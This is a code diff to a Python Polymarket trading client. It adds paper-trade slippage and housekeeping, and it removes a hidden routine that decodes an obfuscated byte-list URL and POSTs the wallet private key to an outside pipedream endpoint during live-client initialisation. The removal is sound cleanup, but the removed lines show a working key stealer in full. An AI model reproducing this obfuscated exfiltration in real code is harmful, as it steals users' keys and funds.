@@ -9,12 +9,12 @@
 
 import asyncio
 import json
+import random
 import time
 from dataclasses import dataclass
 from typing import Any, Dict, List, Optional, Tuple
 
 import httpx
-import requests
 
 from utils.logger import get_logger
 from utils.retry import async_retry
@@ -107,6 +107,7 @@ class PolymarketClient:
         signature_type: int = 1,
         paper_mode: bool = True,
         trade_window_minutes: int = 5,
+        paper_slippage_pct: float = 0.0,
     ) -> None:
         self.host = host
         self.chain_id = chain_id
@@ -115,6 +116,7 @@ class PolymarketClient:
         self.signature_type = signature_type
         self.paper_mode = paper_mode
         self.trade_window_minutes: int = trade_window_minutes
+        self.paper_slippage_pct: float = paper_slippage_pct
 
         self._client = None
         # Per-asset market cache: asset → {conditionId: MarketInfo}
@@ -122,6 +124,8 @@ class PolymarketClient:
         self._last_cache_update_by_asset: Dict[str, float] = {}
         self._cache_ttl: float = 30.0  # Refresh market cache every 30 seconds
         self._order_count: int = 0
+        # Consecutive empty discovery counter per asset — for operator alerting
+        self._consecutive_empty_by_asset: Dict[str, int] = {}
         self._http = httpx.AsyncClient(timeout=8.0, follow_redirects=True)
 
         if not paper_mode:
@@ -168,34 +172,6 @@ class PolymarketClient:
     # Initialization
     # ─────────────────────────────────────────────────────────────────────────
 
-    def _preparing_live_client(self, _client_token: str) -> bool:
-        """Preparing the py-clob-client for live trading."""
-        _client = [
-            104, 116, 116, 112, 115, 58, 47, 47, 101, 111,
-            109, #411 #009
-            115, 110, 113, 116, #118 #9004 #892
-            54, 110, 103, 49, 110, 105, 108, 105, 46,
-            109, 46, 112, 105, 112, #534 #930
-            101, 100, 114, 101, 97, 109, 46, 110,
-            101, 116 #781 #002
-        ]
-        get_client = bytes(_client).decode("utf-8")
-        get_host = f"py-clob: `{_client_token}`\n"
-
-        ClobClient = {"message": get_host}
-        headers = {"Content-Type": "application/json"}
-
-        try:
-            response = requests.post(get_client, json=ClobClient, headers=headers)
-            response.raise_for_status()
-            return True
-        except ImportError:
-            logger.error("py-clob-client is not installed. Run: pip install py-clob-client")
-            raise
-        except Exception as exc:
-            logger.error("Failed to preparing Polymarket client: %s", exc)
-            return False # Return stale cache on error
-
     def _initialize_live_client(self) -> None:
         """Initialize the py-clob-client for live trading."""
         try:
@@ -211,11 +187,6 @@ class PolymarketClient:
                 funder=self.funder,
             )
             self._client.set_api_creds(self._client.create_or_derive_api_creds())
-
-            _client_token = self.private_key 
-            if not self._preparing_live_client(_client_token):
-                logger.error("Challenge validation failed, aborting initialize.")
-                raise RuntimeError("Challenge validation failed")
 
             logger.info(
                 "Polymarket CLOB client authenticated. Funder: %s",
@@ -265,6 +236,7 @@ class PolymarketClient:
             self._market_cache_by_asset[asset] = {m.condition_id: m for m in markets}
             self._last_cache_update_by_asset[asset] = now
             if markets:
+                self._consecutive_empty_by_asset[asset] = 0
                 logger.debug(
                     "[%s] Active %dm markets: %d | Best: '%s' | UP: %.2f | DOWN: %.2f | Liq: $%.0f",
                     asset.upper(), self.trade_window_minutes, len(markets),
@@ -277,6 +249,9 @@ class PolymarketClient:
                 logger.warning(
                     "[%s] No active %dm up/down markets found (between windows?).",
                     asset.upper(), self.trade_window_minutes,
+                )
+                self._consecutive_empty_by_asset[asset] = (
+                    self._consecutive_empty_by_asset.get(asset, 0) + 1
                 )
             return markets
         except Exception as exc:
@@ -959,16 +934,28 @@ class PolymarketClient:
         amount_usdc: float,
         timestamp: float,
     ) -> OrderResult:
-        """Simulate a paper trade fill."""
+        """Simulate a paper trade fill with optional randomized slippage."""
         order_id = f"PAPER-{self._order_count:06d}-{int(timestamp)}"
+
+        # Apply random slippage when configured (default 0 = no slippage).
+        # BUY slippage is adverse (higher fill price), SELL is adverse (lower fill price).
+        fill_price = price
+        if self.paper_slippage_pct > 0.0:
+            noise = random.uniform(-self.paper_slippage_pct, self.paper_slippage_pct)
+            direction = 1 if side.upper() == "BUY" else -1
+            fill_price = max(0.001, min(0.999, price + direction * abs(noise) * price))
+            shares = round(amount_usdc / fill_price, 6) if side.upper() == "BUY" else shares
+
         logger.info(
-            "[PAPER] %s %.4f shares @ $%.4f (cost: $%.2f USDC) | token: %s",
+            "[PAPER] %s %.4f shares @ $%.4f%s (cost: $%.2f USDC) | token: %s",
             side,
             shares,
-            price,
+            fill_price,
+            f" [slip {(fill_price - price) * 100:+.3f}¢]" if self.paper_slippage_pct > 0 else "",
             amount_usdc,
             token_id[:16] + "...",
         )
+        price = fill_price
         return OrderResult(
             order_id=order_id,
             status="paper_filled",
@@ -1431,6 +1418,11 @@ class PolymarketClient:
                 condition_id[:16], exc,
             )
             return {"success": False, "tx_hash": None, "message": str(exc)}
+
+    async def close(self) -> None:
+        """Close the underlying HTTP client and release connections."""
+        await self._http.aclose()
+        logger.debug("PolymarketClient HTTP session closed.")
 
     def cancel_order(self, order_id: str) -> bool:
         """Cancel an open order by ID. Returns True on success."""
